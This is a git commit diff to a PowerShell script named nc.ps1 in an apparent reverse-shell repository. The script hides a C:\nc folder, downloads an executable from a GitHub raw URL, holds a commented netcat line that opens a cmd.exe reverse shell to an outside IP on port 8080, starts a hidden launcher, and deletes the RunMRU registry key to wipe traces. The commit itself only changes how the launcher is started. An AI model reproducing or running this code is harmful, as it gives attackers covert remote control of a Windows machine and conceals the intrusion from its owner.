1d2380423a716701ebc48468fdde2aab7fb504e8
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-10-07 11:02:44 -0400

    Update nc.ps1

--- RevSh/Windows10/nc.ps1
+++ RevSh/Windows10/nc.ps1
@@ -7,5 +7,6 @@ cmd /c "attrib +h C:\nc"
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/voice.exe","C:\nc\voice.exe")
 #echo "nc.exe 64.52.163.41 8080 -e cmd.exe" >> C:\nc\nc_run.bat
 Start-Sleep -s 5
-Start-Process -FilePath C:\nc\rh.exe C:\nc\nc.bat
+cd C:\nc
+cmd.exe /c rh.exe nc.bat
 cmd /c "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va  /f"
